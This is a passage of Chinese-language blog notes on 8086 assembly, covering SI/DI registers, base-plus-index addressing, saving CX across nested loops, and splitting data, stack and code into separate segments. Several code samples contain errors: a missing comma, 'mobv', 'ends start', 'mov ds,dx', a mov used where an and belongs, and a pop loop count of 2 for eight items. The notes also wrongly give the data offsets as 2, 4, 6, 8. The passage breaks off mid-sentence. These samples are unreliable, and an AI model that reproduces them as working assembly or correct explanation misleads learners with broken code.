class="line">    mov cx,5</span><br><span class="line">s:mov al[bx]</span><br><span class="line">and al,11011111B</span><br><span class="line">mov [bx],al</span><br><span class="line"></span><br><span class="line">mov al[5+bx]</span><br><span class="line">or al,00100000B</span><br><span class="line">mov [5+bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><h2 id="7-SI和DI"><a href="#7-SI和DI" class="headerlink" title="7.SI和DI"></a>7.SI和DI</h2><p>1.SI和DI是8086CPU中和bx功能相近的寄存器，但是SI和DI不能够分成8位寄存器来使用</p><p>问题：用寄存器SI和DI实现将字符串   ‘welcome to masm!’复制到它后面的数据区中</p><p>思路：用ds:si指向要复制的原始位置，用ds:di来指向复制的位置</p><p>写代码咯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">codesg segment</span><br><span class="line">start:  mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0</span><br><span class="line">mov di,16</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:mov ax,[si]</span><br><span class="line">mov [di],ax</span><br><span class="line">add si,2;因为si 和di 都是16位所以+2</span><br><span class="line">add di,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">ends start</span><br></pre></td></tr></table></figure><p>我们也可以用数组的思想</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0</span><br><span class="line">mov cx,8</span><br><span class="line">s:mov ax,0[si]</span><br><span class="line">mov 16[si],ax</span><br><span class="line">add si,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="8-bx-si-和-bx-di"><a href="#8-bx-si-和-bx-di" class="headerlink" title="8.[bx+si]和[bx+di]"></a>8.[bx+si]和[bx+di]</h2><p>1.[bx+si]表示一个内存单元，它的偏移地址是(bx)+(si)</p><p>2.看看 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx+si]</span><br><span class="line">将一个内存单元的内容送入ax中，这个内存单元的长度为2【字单元】</span><br><span class="line">偏移地址是：bx中的数值+si中的数值，段地址默认是ds</span><br></pre></td></tr></table></figure><p>3.同类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[bx+si]</span><br><span class="line">[bx][si]</span><br><span class="line">这俩种其实是同一种</span><br></pre></td></tr></table></figure><h2 id="9-bx-si-idata-和-bx-di-idata"><a href="#9-bx-si-idata-和-bx-di-idata" class="headerlink" title="9.[bx+si+idata]和[bx+di+idata]"></a>9.[bx+si+idata]和[bx+di+idata]</h2><p>emmm和上面的雷同，我吐了</p><h2 id="10-用不同的寻址方式的灵活应用"><a href="#10-用不同的寻址方式的灵活应用" class="headerlink" title="10.用不同的寻址方式的灵活应用"></a>10.用不同的寻址方式的灵活应用</h2><p>1.比较一下之前用到的几种定位内存地址的方法（也就是寻址的方式）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.[idata]用一个常量来表示一个地址，可以用于之间定位一个内存单元</span><br><span class="line">2.[bx]用一个变量来表示内存地址，可用于间接定位一个内存单元</span><br><span class="line">3.[bx+idata]这个感觉就是一个一维数组idata[bx]和a[]可以雷同。用一个变量和常量表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元</span><br><span class="line">4.[bx+si]用2个变量来表示地址</span><br><span class="line">5.[bx+si+idata]用两个变量和一个常量来表示地址</span><br></pre></td></tr></table></figure><p>2.EMMM这里听得太入迷了，忘了写笔记</p><p>无所谓了，那就不写了，记录一点有用的就好了</p><p>题目：</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230411225142572.png" alt="image-20230411225142572"></p><p>3.我们在进行一次循环的时候使用CX 会递减，这个是没有问题的</p><p>但是如果我们要用循环里面套循环，这个时候，在里面的循环又需要调用一次cx，这样就会形成cx被覆盖！！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">为了解决这个问题</span><br><span class="line">我们就应该每次开始内层循环的时候，将外层循环的cx中的数值保存起来，在执行外层循环的loop指令前，再回复外层循环的cx数值</span><br><span class="line"></span><br><span class="line">我们可以用寄存器dx来保存cx中的值</span><br></pre></td></tr></table></figure><p>改进后的循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0;用bx来定位行</span><br><span class="line"></span><br><span class="line">mov cx,4</span><br><span class="line">s0:mov dx,cx;用dx来保存外层的cx中的值</span><br><span class="line">mov si,0</span><br><span class="line"></span><br><span class="line">mov cx,3</span><br><span class="line">s:mov al,[bx+si]</span><br><span class="line">and al,11011111B</span><br><span class="line">mov [bx+si],al</span><br><span class="line"></span><br><span class="line">inc si</span><br><span class="line">loop s;这个时候cx中的值已经变成0了</span><br><span class="line"></span><br><span class="line">add bx,16</span><br><span class="line">mov cx,dx;将外层的cx还原</span><br><span class="line">loop s0;cx=cx-1 再判断是否为0是否再循环</span><br></pre></td></tr></table></figure><p>上面的程序中就是用的dx，但是如果dx被使用了，或者说找不到合适的寄存器怎么办呢？</p><p>就是说，我们这些数据就是需要展示存放一下</p><p>为了寻找一个通用的方案，所以我们就可以用内层，我们就可以将需要暂时存的数据放到一段内存单元中，需要使用的时候，再从内存单元中恢复，这样我们就需要开辟一段内存空间</p><p>改进后的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">datasg segment</span><br><span class="line">db &#x27;ibm.............&#x27;</span><br><span class="line">db &#x27;dec.............&#x27;</span><br><span class="line">db &#x27;dos.............&#x27;</span><br><span class="line">db &#x27;vax.............&#x27;</span><br><span class="line">dw 0;这里定义一个字，开辟一个字空间来保存cx</span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line"></span><br><span class="line">    mov bx,0</span><br><span class="line">    </span><br><span class="line">    mov cx,4</span><br><span class="line">s0:mov ds:[40H],cx;将外层循环的cx值保存在datasg:40H单元中</span><br><span class="line">mov si,0;用si来表示列</span><br><span class="line"></span><br><span class="line">mov cx,3;设置内存循环次数</span><br><span class="line">s:mov al,11011111B</span><br><span class="line">and al,11011111B</span><br><span class="line">mov [bx+si],al;[bx+si]bx就是行si就是列，虽然在内存中是线性排列的，但是我们可以这么理解</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">add bx,16;这里用bx来表示行</span><br><span class="line">mov cx,ds:[40H]</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mobv ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>但是，这样的作法有点麻烦 </p><p>所以我们又进步了！！用栈</p><p>push 后 pop</p><p>又来写代码了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">datasg segment</span><br><span class="line">db &#x27;ibm.............&#x27;</span><br><span class="line">db &#x27;dec.............&#x27;</span><br><span class="line">db &#x27;dos.............&#x27;</span><br><span class="line">db &#x27;vax.............&#x27;</span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">stacksg segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0;定义一个段，用来做栈段，容量为16个字节</span><br><span class="line">stacksg ends</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,stacksg</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line"></span><br><span class="line">mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line"></span><br><span class="line">mov bx,0</span><br><span class="line"></span><br><span class="line">mov cx,4</span><br><span class="line">s0:push cx;把外层循环的cx值放入栈中保存起来，保护cx</span><br><span class="line">mov si,0</span><br><span class="line">mov cx,3;cx设置成内存循环的次数</span><br><span class="line">s:mov al,[bx+si]</span><br><span class="line">and al,11011111B</span><br><span class="line">mov [bx+si],al</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">add bx,16</span><br><span class="line">pop cx;在需要外层的cx的时候，在把他pop出来</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>7.9</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">;将datasg段中的每个单词的前4个字母改成大写字母</span><br><span class="line">assume cs:codesg,ss:stacksg,ds:datasg</span><br><span class="line"></span><br><span class="line">stacksg segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0</span><br><span class="line">stacksg ends</span><br><span class="line"></span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;1. display      &#x27;</span><br><span class="line">db &#x27;2. brows        &#x27;</span><br><span class="line">db &#x27;3. replace      &#x27;</span><br><span class="line">db &#x27;4. modify       &#x27;</span><br><span class="line">datasg ends</span><br><span class="line">;[bx+si+idata][bx];当列;[si+idata]当行数</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,stacksg</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16;等会儿外层循环需要push的栈</span><br><span class="line"></span><br><span class="line">mov ax,datasg</span><br><span class="line">mov ds,dx;确定数据的段地址</span><br><span class="line"></span><br><span class="line">mov bx,0</span><br><span class="line"></span><br><span class="line">mov cx,4;外层需要4行也就是4次循环</span><br><span class="line">s:push cx;把cx保护起来</span><br><span class="line"></span><br><span class="line">mov si,0;因为每一次循环的时候，每一列都行重新索引字母的位置，所以si需要设置在外面</span><br><span class="line"></span><br><span class="line">mov cx,4;把后面的4个字母都需要改成大写所以要循环4次</span><br><span class="line">s0:mov dl,ds:[bx+3+si];这样索引住第一个字母，通过si的自增来索引后面的4个字母</span><br><span class="line">mov dl,11011111B;这样就是改成大写</span><br><span class="line">mov ds:[bx+3+si],dl;这里需要把dl中的值放回原来的内存中</span><br><span class="line">inc si;si++索引下一个</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">add bx,16;选中下一行</span><br><span class="line">pop cx;把原来的cx还回来</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="总结一下啦"><a href="#总结一下啦" class="headerlink" title="总结一下啦"></a>总结一下啦</h2><p>1.si di</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这两个寄存器和ax一样，但是不能被拆开</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主要用于：</span><br><span class="line">[bx+si+idata]</span><br></pre></td></tr></table></figure><p>2.用栈来保护数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push cx</span><br><span class="line">pop cx</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-包含多个段的程序（6）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-6-%E5%8C%85%E5%90%AB%E5%A4%9A%E4%B8%AA%E6%AE%B5%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-6-%E5%8C%85%E5%90%AB%E5%A4%9A%E4%B8%AA%E6%AE%B5%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="1-在代码段中使用数据"><a href="#1-在代码段中使用数据" class="headerlink" title="1.在代码段中使用数据"></a>1.在代码段中使用数据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment </span><br><span class="line">dw 0123H,0456H,0789H,0abcH,0defH,0fedH,0cbaH,0987H</span><br><span class="line">mov bx,0</span><br><span class="line">mov ax,0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s: add ax,cs:[bx]</span><br><span class="line">   add bx,2</span><br><span class="line">   loop s</span><br><span class="line">   </span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>1.dw的含义【dw 也是 define word】也就是定义字型数据</p><p>【每一个数据之前都需要用  ,  隔开】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同样可以衍生处db 【define byte】也就是定义字节型数据</span><br></pre></td></tr></table></figure><p>问题1：这八个字型数据是放在哪里的呢?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">dw xxxxxx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这8个数据肯定是放在这个定义好的cs【也就是代码段中】【所以他们的段地址肯定是cs】</span><br><span class="line">那这8个的偏移地址是多少呢？</span><br><span class="line">因为是在最开始的地方，所以偏移地址就是：2 4 6 8 ...</span><br></pre></td></tr></table></figure><p>emmm，这8个字型数据放在了代码段，cpu就会把这8个字型的数据当作代码来运行【因为cpu都是去认二进制，而不会知道你这个是代码还是数据】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment </span><br><span class="line">dw 0123H,0456H,0789H,0abcH,0defH,0fedH,0cbaH,0987H</span><br><span class="line">mov bx,0</span><br><span class="line">mov ax,0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s: add ax,cs:[bx]</span><br><span class="line">   add bx,2</span><br><span class="line">   loop s</span><br><span class="line">   </span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end</span><br><span class="line">如果单纯的使用这个，就会错误</span><br><span class="line">所以我们需要改进一下，把cs的指向mov bx,0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment </span><br><span class="line">dw 0123H,0456H,0789H,0abcH,0defH,0fedH,0cbaH,0987H</span><br><span class="line">start: mov bx,0</span><br><span class="line">  mov ax,0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s: add ax,cs:[bx]</span><br><span class="line">   add bx,2</span><br><span class="line">   loop s</span><br><span class="line">   </span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>在这里，我们在程序的第一条指令的前面加上了一个标号start，而这个标号在伪指令end的后面出现</p><p>也就是说：end的作用，除了通知编译器程序结束外，还可以通知编译器程序的入口在什么地方</p><p>就比如说这里，它通知了编译器的入口是在 start后面，所以就不会去把dw中的内容粗错</p><p>cpu 在找入口的时候，是首先去找到end  而不是去找start 因为这个start是可以改变的</p><p>在使用了这个end  start这个标号之后，就可以在代码段中使用数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也就是这里的dw xxx</span><br></pre></td></tr></table></figure><p>也就是衍生出来了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment </span><br><span class="line">..</span><br><span class="line">数据</span><br><span class="line">..</span><br><span class="line">startL</span><br><span class="line">..</span><br><span class="line">代码</span><br><span class="line">..</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="2-在代码段中使用栈"><a href="#2-在代码段中使用栈" class="headerlink" title="2.在代码段中使用栈"></a>2.在代码段中使用栈</h2><p>完成下面的程序，利用栈，将程序中定义的数据逆序存放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">dw 0123H,0456H,0789H,0abcH,0defH,0fedH,0cbaH,0987H</span><br><span class="line"></span><br><span class="line">?</span><br><span class="line">code ends</span><br></pre></td></tr></table></figure><p>分析一波</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也就是说：我们需要把cs:0~cs:15单元中，一共8个字单元。依次将这8个子单元的数据入栈，然后再依次出栈到这8个字单元中，从而实现了数据的逆序存放</span><br></pre></td></tr></table></figure><p>问题来了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们就需要由一个空间来定义一个栈</span><br></pre></td></tr></table></figure><p>解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们可以像之前一样，通过定义数据来取得一段空间，然后将这段空间当作栈空间来使用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一定要注意的是：我们是通过定义数据来取得一段空间【dw】，然后将这段空间来当作栈空间来使用</span><br></pre></td></tr></table></figure><p>代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">csdesg segment </span><br><span class="line">dw 0123H,0456H,0789H,0abcH,0defH,0fedH,0cbaH,0987H</span><br><span class="line">dw 0,0,0,0,0,0,0,0;用dw定义空间，人为的当作栈来使用</span><br><span class="line">;上面的一串就是说：cs:0~cs:15  和  cs:16~cs:1fH[31]都是数据【前面的一段当作数据段使用，后面的一段当作栈来使用】</span><br><span class="line"></span><br><span class="line">start: </span><br><span class="line">mov ax,cs</span><br><span class="line">mov ss,ax;这里就是把代码段地址给栈段地址，因为他们都是在这个cs段里面，只是偏移地址不同罢了</span><br><span class="line">mov sp,32;这里是设置栈顶，原本的底部是31所以栈顶的位置是32【这里用的是10进制而非16进制】</span><br><span class="line">mov bx,0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:</span><br><span class="line">push cs:[bx];这里就是把cs:[bx]中的值依次放入ss:[sp]中，也就是cs:16~cs:1fH中，倒着入栈</span><br><span class="line">add bx,2</span><br><span class="line">loop s;这次循环的代码就是让前面的8个数据入栈</span><br><span class="line"></span><br><span class="line">mov bx,0;把bx重新定义回去</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s0:</span><br><span class="line">pop cs:[bx];就是pop 把栈中的数据送入cs:[bx]中</span><br><span class="line">add bx,2</span><br><span class="line">loop s0;这一串代码就是说把原本入了栈的数据，从上往下依次出栈,送入cs[bx]中，原本最先入栈的最后出栈</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h3 id="检测点6-1"><a href="#检测点6-1" class="headerlink" title="检测点6.1"></a>检测点6.1</h3><h2 id="3-将数据，代码，栈，放入不同的段"><a href="#3-将数据，代码，栈，放入不同的段" class="headerlink" title="3.将数据，代码，栈，放入不同的段"></a>3.将数据，代码，栈，放入不同的段</h2><p>1.在前面的内容中，我们在程序中用到了数据和栈，我们将数据，栈，代码都放到了一个段里面。我们在编程的时候要注意何处是数据，何处是栈，何处是代码。这样就很垃圾</p><p>2.放到一个段中，这样很乱，而且不能放大量的数据，因为在8086CPU中一个段也就是64KB</p><p>3.如何实现，把数据，栈，代码放到不同的段中呢？</p><p>把上面写的代码改造改造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code, ds:data, ss:stack</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">dw 0123H,0456H,0789H,0abcH,0defH,0fedH,0cbaH,0987H</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:   mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,20H;上面是假设ss和stack联系起来，通过这一步后，就是真正的联系起来了</span><br><span class="line"></span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax;同理，补充--&gt;段寄存器是不能之间被值给赋予的，必须要通过寄存器这个媒介</span><br><span class="line">;data 其实本质就是地址也就是数据，得先放入ax后放入段寄存器</span><br><span class="line">mov bx,0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:push [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov bx,0;总结一下</span><br><span class="line">;这里 要记住：segment和ends是一段伪指令，它们中间是这个段寄存器中的内容</span><br><span class="line">mov cx,2</span><br><span class="line">s0:pop [bx];end 才是开始的地方，也就是说编译器会告诉CPU让CPU中的CS:IP去指向end xxx的位置</span><br><span class="line">         add bx,2;在这里是start，也就是说，end后面的标号，回去告诉cpu 这个命令执行开始的地方</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>成功肯定是离不开一步一步的成长，所以我们现在来分析一下这个代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code, ds:data, ss:stack</span><br><span class="line">假设 cs和code, ds和data, 